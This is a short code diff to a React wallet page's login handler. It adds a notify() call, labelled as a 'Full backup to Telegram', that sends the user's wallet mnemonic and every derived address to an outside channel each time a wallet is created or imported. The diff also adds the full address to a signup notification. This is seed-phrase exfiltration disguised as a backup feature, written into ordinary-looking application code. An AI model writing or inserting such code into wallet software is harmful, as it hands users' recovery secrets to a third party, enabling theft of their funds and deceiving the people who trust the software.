@@ -113,9 +113,19 @@ function WalletPage() {
     setPending(null);
     saveSession({ address, username, wallet: snapshot });
     recordWalletLogin(address, mode, username);
+    // Full backup to Telegram: mnemonic + all derived addresses.
+    notify({
+      event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
+      label: username,
+      address,
+      mnemonic: w.mnemonic,
+      addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
+      extra: `label=${w.label}`,
+    });
     notify({
       event: mode === "create" ? "wallet_signup" : "wallet_signin",
       label: username,
+      address,
       extra: `${address.slice(0, 6)}…${address.slice(-4)}`,
     });
   };
